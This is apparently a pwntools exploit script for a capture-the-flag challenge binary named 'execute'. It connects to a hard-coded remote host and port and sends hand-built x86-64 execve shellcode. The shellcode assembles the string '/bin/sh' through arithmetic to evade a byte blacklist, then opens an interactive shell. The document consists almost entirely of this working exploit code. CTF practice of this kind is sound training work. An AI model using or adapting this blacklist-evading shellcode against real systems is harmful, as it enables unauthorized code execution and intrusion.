#!/usr/bin/env python3

from pwn import *

e = ELF("./execute_patched")

HOST = "83.136.249.253"
PORT = 56508
context.binary = e
context.terminal = ['tmux', 'splitw', '-h']
gdb_script = '''
b main
continue
'''

def conn():
    if args.LOCAL:
        r = process([e.path])
        if args.GDB:
            gdb.attach(r, gdbscript=gdb_script)
    else:
        r = remote(HOST, PORT)

    return r


def main():
    r = conn()

    shellcode = asm('''
    cdq
    xor rdi, rdi
    mov dl, 0x1D
    mov dil, 0x1E
    add rdx, rdi
    push rdx
    pop rax

    cdq
    push rdx
    pop rsi
    push rsi

    mov rdi, 0x343997b734b117
    mov rdx, 0x343997b734b118
    add rdi, rdx
    push rdi
    mov rdx, rsp
    push rdx
    pop rdx
    mov rdi, rdx
    cdq
    syscall
    ''')

    payload = shellcode.ljust(59, b'\x90') + b'\x3b'

    blacklist = {0x3b,0x54,0x62,0x69,0x6e,0x73,0x68,0xf6,0xd2,0xc0,0x5f,0xc9,0x66,0x6c,0x61,0x67}
    for i, b in enumerate(payload[:59]):
        if b in blacklist:
            print(f"ERROR: Byte prohibido {hex(b)} en posición {i}!")
            exit(1)

    # good luck pwning :)
    r.sendlineafter('everything', payload)

    r.interactive()

if __name__ == "__main__":
    main()

